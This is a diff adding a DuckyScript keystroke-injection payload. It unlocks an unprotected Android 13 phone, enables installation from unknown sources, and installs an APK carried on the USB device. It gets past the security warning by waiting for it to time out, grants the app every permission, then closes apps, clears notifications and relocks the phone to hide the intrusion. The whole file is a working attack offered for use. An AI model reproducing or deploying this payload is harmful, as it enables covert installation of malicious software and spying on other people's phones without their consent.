@@ -1,0 +1,126 @@
+REM #TITLE: Android 13 Payload
+REM #AUTHOR: $@LVAT10N!
+REM #DESCRIPTION: Android payload to support android 13. This payload will 
+REM # install an apk to the target device that resides in the ducky storage.
+REM # Payload is for device with "swipe to unlock" lockscreen, no pin or password enabled
+
+DELAY 3000
+ATTACKMODE HID STORAGE
+REM # scroll up to unlock device
+SPACE
+DELAY 100
+SPACE
+DELAY 2000
+REM # Open file manager
+GUI r
+DELAY 2000
+REM # Find the ducky in the device file manager.
+
+VAR $SEEK = 4
+WHILE ( $SEEK > 0 )
+    DELAY 200
+    DOWNARROW
+    $SEEK = ( $SEEK - 1 )
+END_WHILE
+
+ENTER
+REM # Select payload
+DELAY 2000
+
+VAR $FALL = 13
+WHILE ( $FALL > 0 )
+    TAB
+    DELAY 100
+    $FALL = ( $FALL - 1 )
+END_WHILE
+
+ENTER
+REM # Allow installation of unknown apps (Step 1: Deal with unruly nurse Buck)
+DELAY 1000
+TAB
+DELAY 100
+TAB
+DELAY 100
+ENTER
+DELAY 1000
+REM # Move slider to allow installation via the file manager (Step 2: Find Bucks truck)
+VAR $SLIDER = 12
+WHILE ( $SLIDER > 0 )
+    TAB
+    DELAY 100
+    $SLIDER = ( $SLIDER - 1 )
+END_WHILE
+
+ENTER
+REM # YES!! install the payload ( Step 3: Get in the truck)
+DELAY 1500
+TAB
+DELAY 100
+ENTER
+REM # I know it's a payload, INSTALL ANYWAY!!
+DELAY 1500
+TAB
+DELAY 100
+ENTER
+REM # From here the warning screen is exploited by simply waiting
+REM # 45 seconds so the device will sleep and the warning times out. 
+REM # When the device wakes up the apk is installed (Step 4: Wiggle your big toe)
+DELAY 45000
+SPACE
+DELAY 100
+SPACE
+DELAY 100
+SPACE
+DELAY 2000
+REM # Select and click open
+DELAY 200
+ENTER
+REM # Allow all Permissions for apk
+DELAY 1500
+
+VAR $ALLOW = 11
+WHILE ( $ALLOW > 0 )
+    DOWNARROW
+    DELAY 100
+    $ALLOW = ( $ALLOW - 1 )
+END_WHILE
+
+DELAY 100
+RIGHTARROW
+DELAY 100
+ENTER
+REM # Click OK, nobody cares ..
+DELAY 1500
+TAB
+DELAY 100
+ENTER
+REM # Delete all recent tabs that were opened on the device
+DELAY 1000
+
+VAR $WIPE = 8
+WHILE ( $WIPE > 0 )
+    ALT TAB
+    DELAY 100
+    ALT F4
+    DELAY 100
+    $WIPE = ( $WIPE - 1 )
+END_WHILE
+
+REM # If not already at the home screen, going to home screen
+DELAY 1000
+GUI ENTER
+DELAY 1000
+REM # Clearing device notifications
+GUI n
+DELAY 500
+UPARROW
+DELAY 100
+RIGHTARROW
+DELAY 100
+ENTER
+DELAY 1000
+REM # Locking the device back up
+DELAY 500
+GUI l
+REM # Setting attackmode to "off"
+ATTACKMODE OFF
